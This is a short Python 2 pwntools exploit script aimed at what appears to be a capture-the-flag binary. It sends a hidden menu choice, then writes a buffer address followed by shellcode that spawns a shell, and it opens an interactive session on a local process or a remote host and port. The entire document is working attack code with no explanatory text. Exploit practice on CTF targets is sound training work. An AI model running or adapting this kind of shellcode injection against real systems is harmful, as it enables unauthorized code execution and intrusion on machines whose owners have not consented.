#!/usr/bin/env python2

from pwn import *
#context.log_level = 0

# Setup goodies
binary = '../../games/2/ctf'
context(os = 'linux', arch = 'amd64')
elf = ELF(binary)

# Demo should work even without a HOST
if 'HOST' in args:
    r = remote(args['HOST'], int(args['PORT']))
else:
     r = process(binary)

r.recvuntil("4. Divide two numbers")

r.sendline("9")
r.recvuntil("Enter two numbers to do math with, e.g. [3 4]")

buf_start = elf.symbols['buf']
buf_shellcode = buf_start + 8

print "Shellcode will be located at: ", format(buf_shellcode, '02x')

r.sendline(flat(
    buf_shellcode,
    asm(shellcraft.sh())
))

r.clean()
r.interactive()

